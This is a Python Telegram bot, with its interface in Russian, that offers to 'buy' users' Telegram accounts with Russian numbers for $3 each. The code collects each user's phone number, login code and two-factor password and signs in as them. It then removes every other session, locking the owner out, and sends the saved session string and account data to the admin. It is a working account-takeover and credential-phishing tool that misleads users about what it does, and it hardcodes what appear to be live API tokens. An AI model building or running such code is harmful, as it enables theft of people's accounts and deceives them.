import asyncio
import os
import json
import shutil
from datetime import datetime
from typing import Dict, Optional, List
from pathlib import Path

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, AuthKeyUnregisteredError
from telethon.tl.types import Authorization
import pyrogram
from pyrogram import Client

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Конфигурация
BOT_TOKEN = 'ваш_токен_бота'  # Замените на свой токен
CRYPTOBOT_TOKEN = '505975:AAWB2WYvz4wJuseOm4nrs875jo4ORUJl7ww'
ADMIN_ID = 7037764178
API_ID = 30147101
API_HASH = '72c394e899371cf4f9f9253233cbf18f'

# База данных для хранения данных пользователей
user_data: Dict[int, Dict] = {}
user_sessions: Dict[int, str] = {}
user_balance: Dict[int, float] = {}

# Состояния для FSM
STATE_WAITING_PHONE = 1
STATE_WAITING_CODE = 2
STATE_WAITING_PASSWORD = 3
STATE_CHECKING_SESSIONS = 4

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {'state': None, 'phone': None, 'client': None}
    
    keyboard = [
        [InlineKeyboardButton("➕ Сдать аккаунт", callback_data='sell_account')],
        [InlineKeyboardButton("💰 Мой баланс", callback_data='my_balance')],
        [InlineKeyboardButton("💳 Вывести деньги", callback_data='withdraw')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = """
👋 Привет, друг!

🤖 Я покупаю Telegram аккаунты с номерами +7
💵 За каждый аккаунт плачу *3$* на баланс
💰 Вывод через CryptoBot (Telegram)

✨ Просто нажми кнопку ниже и следуй инструкциям
⚡ Все быстро, безопасно и анонимно
    """
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == 'sell_account':
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = """
📱 *Сдача аккаунта*
        
1️⃣ Отправь мне свой номер телефона в формате *+7XXXXXXXXXX*
2️⃣ Я проверю аккаунт
3️⃣ Если все ок - сразу начислю 3$

⚠️ *Внимание!*
• Номер должен быть российским (+7)
• Должна быть возможность войти
• Аккаунт не должен быть забанен
        """
        
        user_data[user_id]['state'] = STATE_WAITING_PHONE
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif query.data == 'my_balance':
        balance = user_balance.get(user_id, 0)
        keyboard = [
            [InlineKeyboardButton("💸 Вывести", callback_data='withdraw')],
            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = f"""
💰 *Твой баланс:* `${balance:.2f}`
        
💵 За каждый аккаунт: *+3$*
🔄 Можно вывести от *1$*
💎 Вывод через CryptoBot
        """
        
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif query.data == 'withdraw':
        balance = user_balance.get(user_id, 0)
        
        if balance < 1:
            keyboard = [[InlineKeyboardButton("➕ Сдать аккаунт", callback_data='sell_account')],
                       [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            text = f"""
😔 Недостаточно средств
            
💰 Твой баланс: `${balance:.2f}`
💵 Минимальная сумма вывода: *1$*
            
🎯 Сдай еще один аккаунт и выводи!
            """
        else:
            keyboard = [
                [InlineKeyboardButton("✅ Подтвердить вывод", callback_data='confirm_withdraw')],
                [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            text = f"""
💸 *Запрос на вывод*
            
💰 Сумма: `${balance:.2f}`
💎 Способ: CryptoBot
🆔 Твой ID: `{user_id}`
            
⚠️ Вывод обрабатывается *вручную*
⏱️ Время обработки: *5-30 минут*
            """
        
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif query.data == 'help':
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = """
❓ *Частые вопросы*
        
Q: Как сдать аккаунт?
A: Нажми "Сдать аккаунт", отправь номер, получи код из Telegram, отправь его мне
        
Q: Сколько платите?
A: За каждый аккаунт с номером +7 - 3$
        
Q: Как вывод?
A: Через CryptoBot в Telegram, минималка 1$
        
Q: Это безопасно?
A: Да, мы только проверяем аккаунт. Все другие сессии будут удалены автоматически
        
Q: Есть ограничения?
A: Только российские номера (+7), аккаунт должен быть в порядке
        """
        
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif query.data == 'back_to_main':
        await start(update, context)
        await query.delete()
    
    elif query.data == 'confirm_withdraw':
        balance = user_balance.get(user_id, 0)
        if balance >= 1:
            # Уведомляем админа
            admin_text = f"""
🔄 *Новый запрос на вывод*
            
👤 Пользователь: @{query.from_user.username or 'без username'}
🆔 ID: `{user_id}`
💰 Сумма: `${balance:.2f}`
💎 Через: CryptoBot
            """
            
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_text,
                parse_mode='Markdown'
            )
            
            # Обнуляем баланс пользователя
            user_balance[user_id] = 0
            
            keyboard = [[InlineKeyboardButton("🔙 На главную", callback_data='back_to_main')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            text = f"""
✅ *Запрос отправлен!*
            
💰 Сумма: `${balance:.2f}`
⏱️ Обработка: *5-30 минут*
📩 Уведомим, когда отправим
            
💬 По вопросам: @{context.bot.username}
            """
            
            await query.edit_message_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
    
    elif query.data == 'auto_remove_sessions':
        await auto_remove_sessions_callback(update, context)

async def auto_remove_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id in user_data and user_data[user_id].get('state') == STATE_CHECKING_SESSIONS:
        client = user_data[user_id].get('client')
        if client:
            try:
                await query.edit_message_text(
                    text="🔄 Удаляю все другие сессии...",
                    reply_markup=None
                )
                
                # Автоматически удаляем все другие сессии
                success = await remove_other_sessions(client)
                
                if success:
                    await process_account(query, context, user_id, client)
                else:
                    keyboard = [
                        [InlineKeyboardButton("🔄 Попробовать снова", callback_data='auto_remove_sessions')],
                        [InlineKeyboardButton("🔙 Отмена", callback_data='back_to_main')]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await query.edit_message_text(
                        text="❌ Не удалось удалить сессии. Попробуй снова или отмени.",
                        reply_markup=reply_markup
                    )
                    
            except Exception as e:
                await query.edit_message_text(f"❌ Ошибка: {str(e)}\nНачни заново /start")
                if client:
                    await client.disconnect()
                user_data[user_id] = {'state': None, 'phone': None, 'client': None}

async def remove_other_sessions(client: TelegramClient) -> bool:
    """Удаляет все другие сессии кроме текущей"""
    try:
        # Получаем список всех авторизаций
        auths = await client(GetAuthorizationsRequest())
        
        # Находим хэш текущей сессии
        current_hash = None
        sessions_to_remove = []
        
        for auth in auths.authorizations:
            if isinstance(auth, Authorization):
                if auth.current:
                    current_hash = auth.hash
                else:
                    sessions_to_remove.append(auth.hash)
        
        if not current_hash:
            return False
        
        # Удаляем все другие сессии
        removed_count = 0
        for session_hash in sessions_to_remove:
            try:
                result = await client(ResetAuthorizationRequest(hash=session_hash))
                if result:
                    removed_count += 1
                await asyncio.sleep(0.5)  # Небольшая задержка между запросами
            except Exception as e:
                print(f"Ошибка удаления сессии {session_hash}: {e}")
                continue
        
        # Проверяем, что осталась только текущая сессия
        auths_after = await client(GetAuthorizationsRequest())
        other_sessions_after = [a for a in auths_after.authorizations 
                              if isinstance(a, Authorization) and not a.current]
        
        return len(other_sessions_after) == 0
        
    except Exception as e:
        print(f"Ошибка в remove_other_sessions: {e}")
        return False

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_text = update.message.text
    
    if user_id not in user_data:
        user_data[user_id] = {'state': None, 'phone': None, 'client': None}
    
    state = user_data[user_id].get('state')
    
    if state == STATE_WAITING_PHONE:
        # Проверяем номер телефона
        if message_text.startswith('+7') and len(message_text) == 12 and message_text[1:].isdigit():
            user_data[user_id]['phone'] = message_text
            user_data[user_id]['state'] = STATE_WAITING_CODE
            
            # Создаем клиент Telethon
            session = StringSession()
            client = TelegramClient(session, API_ID, API_HASH)
            
            try:
                await client.connect()
                sent = await client.send_code_request(message_text)
                user_data[user_id]['phone_code_hash'] = sent.phone_code_hash
                user_data[user_id]['client'] = client
                
                keyboard = [[InlineKeyboardButton("🔙 Отмена", callback_data='back_to_main')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    "✅ Номер принят!\n\n📲 Отправь код из Telegram (5 цифр):",
                    reply_markup=reply_markup
                )
                
            except PhoneNumberInvalidError:
                await update.message.reply_text("❌ Неверный номер телефона. Попробуй еще раз:")
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка: {str(e)}\nПопробуй еще раз:")
        
        else:
            await update.message.reply_text("❌ Неверный формат номера. Отправь номер в формате +7XXXXXXXXXX:")
    
    elif state == STATE_WAITING_CODE:
        if message_text.isdigit() and len(message_text) == 5:
            try:
                client = user_data[user_id]['client']
                phone = user_data[user_id]['phone']
                phone_code_hash = user_data[user_id]['phone_code_hash']
                
                try:
                    await client.sign_in(
                        phone=phone,
                        code=message_text,
                        phone_code_hash=phone_code_hash
                    )
                    
                    # Проверяем сессии
                    await check_sessions(update, context, user_id, client)
                    
                except SessionPasswordNeededError:
                    user_data[user_id]['state'] = STATE_WAITING_PASSWORD
                    await update.message.reply_text("🔐 Аккаунт защищен 2FA. Отправь пароль:")
                    return
                
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка входа: {str(e)}\nНачни заново /start")
                user_data[user_id]['state'] = None
                if user_data[user_id].get('client'):
                    await user_data[user_id]['client'].disconnect()
        
        else:
            await update.message.reply_text("❌ Код должен состоять из 5 цифр. Попробуй еще раз:")
    
    elif state == STATE_WAITING_PASSWORD:
        try:
            client = user_data[user_id]['client']
            await client.sign_in(password=message_text)
            await check_sessions(update, context, user_id, client)
            
        except Exception as e:
            await update.message.reply_text(f"❌ Неверный пароль: {str(e)}\nНачни заново /start")
            user_data[user_id]['state'] = None
            if user_data[user_id].get('client'):
                await user_data[user_id]['client'].disconnect()

async def check_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, client: TelegramClient):
    try:
        # Получаем список сессий
        auths = await client(GetAuthorizationsRequest())
        
        # Фильтруем активные сессии (кроме текущей)
        other_sessions = []
        
        for auth in auths.authorizations:
            if isinstance(auth, Authorization):
                if not auth.current:
                    other_sessions.append(auth)
        
        if other_sessions:
            # Есть другие сессии - предлагаем автоматическое удаление
            user_data[user_id]['state'] = STATE_CHECKING_SESSIONS
            
            session_info = "\n".join([f"• {s.device_model or 'Unknown'} ({s.platform or 'Unknown'})" 
                                    for s in other_sessions])
            
            keyboard = [
                [InlineKeyboardButton("🗑️ УДАЛИТЬ ВСЕ СЕССИИ АВТОМАТИЧЕСКИ", callback_data='auto_remove_sessions')],
                [InlineKeyboardButton("🔙 Отмена", callback_data='back_to_main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            text = f"""
⚠️ *Обнаружены другие сессии* ({len(other_sessions)} шт.)
            
{session_info}
            
✅ *Я могу удалить их автоматически:*
1️⃣ Нажми кнопку ниже
2️⃣ Все сессии кроме текущей будут удалены
3️⃣ Проверка займет несколько секунд

❗ *Внимание:* После удаления выйдет из Telegram на всех устройствах кроме этого
            """
            
            if hasattr(update, 'message'):
                await update.message.reply_text(
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            else:
                await update.edit_message_text(
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode='Markdown'
                )
            
        else:
            # Нет других сессий - продолжаем
            await process_account(update, context, user_id, client)
            
    except Exception as e:
        error_text = f"❌ Ошибка проверки сессий: {str(e)}"
        if hasattr(update, 'message'):
            await update.message.reply_text(error_text)
        else:
            await update.edit_message_text(text=error_text)
        
        user_data[user_id]['state'] = None
        if client:
            await client.disconnect()

async def process_account(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, client: TelegramClient):
    try:
        # Получаем информацию об аккаунте
        me = await client.get_me()
        
        # Проверяем номер телефона
        phone = me.phone
        if not phone or not phone.startswith('+7'):
            error_text = "❌ Номер не российский (+7). Подходят только номера России."
            if hasattr(update, 'message'):
                await update.message.reply_text(error_text)
            else:
                await update.edit_message_text(text=error_text)
            
            await client.disconnect()
            user_data[user_id] = {'state': None, 'phone': None, 'client': None}
            return
        
        # Начисляем баланс
        user_balance[user_id] = user_balance.get(user_id, 0) + 3
        
        # Получаем сессию для TData
        session_string = client.session.save()
        user_sessions[user_id] = session_string
        
        # Конвертируем в TData
        tdata_path = await convert_to_tdata(session_string, me, phone)
        
        # Отправляем админу
        await send_to_admin(context, user_id, me, phone, tdata_path)
        
        # Отправляем сообщение пользователю
        if hasattr(update, 'message'):
            message = update.message
        else:
            message = update
        
        balance = user_balance[user_id]
        
        keyboard = [
            [InlineKeyboardButton("💰 Мой баланс", callback_data='my_balance')],
            [InlineKeyboardButton("💳 Вывести", callback_data='withdraw')],
            [InlineKeyboardButton("➕ Сдать еще аккаунт", callback_data='sell_account')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = f"""
🎉 *Аккаунт успешно проверен!*
        
👤 Аккаунт: @{me.username or 'без username'}
📞 Номер: `{phone}`
✅ Статус: *Верифицирован*
✅ Сессии: *Только текущая*
        
💰 Начислено: *+3$*
💸 Твой баланс: *${balance:.2f}*
        
🔄 Можно выводить или сдать еще аккаунт
        """
        
        if hasattr(message, 'edit_message_text'):
            await message.edit_message_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await message.reply_text(
                text=text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        
        # Сохраняем сессию и отключаем клиент
        await save_session_data(user_id, me, phone, session_string)
        await client.disconnect()
        user_data[user_id] = {'state': None, 'phone': None, 'client': None}
        
    except Exception as e:
        error_text = f"❌ Ошибка обработки аккаунта: {str(e)}"
        if hasattr(update, 'message'):
            await update.message.reply_text(error_text)
        else:
            await update.edit_message_text(text=error_text)
        
        if client:
            await client.disconnect()
        user_data[user_id] = {'state': None, 'phone': None, 'client': None}

async def convert_to_tdata(session_string: str, user_info, phone: str) -> str:
    """Конвертируем сессию в TData"""
    try:
        # Создаем временную папку для TData
        timestamp = int(datetime.now().timestamp())
        tdata_dir = Path(f"tdata_{user_info.id}_{timestamp}")
        tdata_dir.mkdir(exist_ok=True)
        
        # Создаем структуру TData
        # Это упрощенная версия, для реальной конвертации нужны дополнительные библиотеки
        # или использование pyrogram для создания TData
        
        # Сохраняем сессию
        session_file = tdata_dir / "session.session"
        session_file.write_text(session_string)
        
        # Создаем файл с информацией
        info = {
            "user_id": user_info.id,
            "username": user_info.username,
            "first_name": user_info.first_name,
            "last_name": user_info.last_name,
            "phone": phone,
            "timestamp": timestamp,
            "date": datetime.now().isoformat()
        }
        
        info_file = tdata_dir / "account.json"
        info_file.write_text(json.dumps(info, indent=2, ensure_ascii=False))
        
        # Для реального TData нужно создать дополнительные файлы
        # Временный файл конфигурации
        config_content = f"""[telegram]
api_id={API_ID}
api_hash={API_HASH}
[account]
phone={phone}
session_string={session_string}
"""
        
        config_file = tdata_dir / "config.ini"
        config_file.write_text(config_content)
        
        return str(tdata_dir)
        
    except Exception as e:
        print(f"Ошибка конвертации в TData: {e}")
        return ""

async def save_session_data(user_id: int, user_info, phone: str, session_string: str):
    """Сохраняем данные сессии в файл"""
    try:
        data_dir = Path("sessions_data")
        data_dir.mkdir(exist_ok=True)
        
        filename = f"{user_id}_{user_info.id}_{int(datetime.now().timestamp())}.json"
        filepath = data_dir / filename
        
        data = {
            "seller_id": user_id,
            "account_id": user_info.id,
            "username": user_info.username,
            "first_name": user_info.first_name,
            "last_name": user_info.last_name,
            "phone": phone,
            "session_string": session_string,
            "timestamp": datetime.now().isoformat(),
            "price": 3.0,
            "status": "completed"
        }
        
        filepath.write_text(json.dumps(data, indent=2, ensure_ascii=False))
        
    except Exception as e:
        print(f"Ошибка сохранения данных: {e}")

async def send_to_admin(context: ContextTypes.DEFAULT_TYPE, seller_id: int, account_info, phone: str, tdata_path: str):
    """Отправляем информацию админу"""
    try:
        admin_text = f"""
🆕 *Новый аккаунт получен!*
        
👤 *Продавец:*
ID: `{seller_id}`
Username: @{context.bot.get_chat(seller_id).username or 'N/A'}
        
📱 *Аккаунт:*
ID: `{account_info.id}`
Username: @{account_info.username or 'N/A'}
Имя: {account_info.first_name or ''} {account_info.last_name or ''}
Номер: `{phone}`
        
💰 *Финансы:*
Стоимость: `3$`
Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}
        
✅ *Сессии:* Удалены все кроме текущей
        """
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_text,
            parse_mode='Markdown'
        )
        
        # Отправляем TData если есть
        if os.path.exists(tdata_path):
            try:
                # Создаем архив
                zip_path = f"{tdata_path}.zip"
                shutil.make_archive(tdata_path, 'zip', tdata_path)
                
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=ADMIN_ID,
                        document=f,
                        filename=f"tdata_{account_info.id}.zip",
                        caption=f"📦 TData для аккаунта {account_info.id}"
                    )
                
                # Удаляем временные файлы
                shutil.rmtree(tdata_path)
                os.remove(zip_path)
                
            except Exception as e:
                print(f"Ошибка отправки TData: {e}")
                # Отправляем сессию как текст если не удалось отправить архив
                session_text = f"""
🔐 *Session String:*
```{user_sessions.get(seller_id, 'Нет данных')}```
                """
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=session_text,
                    parse_mode='Markdown'
                )
            
    except Exception as e:
        print(f"Ошибка отправки админу: {e}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Ошибка: {context.error}")
    if update and update.effective_user:
        try:
            await context.bot.send_message(
                chat_id=update.effective_user.id,
                text="❌ Произошла ошибка. Попробуй еще раз /start"
            )
        except:
            pass

def main():
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CallbackQueryHandler(auto_remove_sessions_callback, pattern='^auto_remove_sessions$'))
    
    # Обработчик сообщений
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    print("🤖 Бот запущен...")
    print(f"👑 Админ: {ADMIN_ID}")
    print("⚡ Ожидаю пользователей")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    # Создаем папки для данных
    Path("sessions_data").mkdir(exist_ok=True)
    Path("tdata_temp").mkdir(exist_ok=True)
    
    main()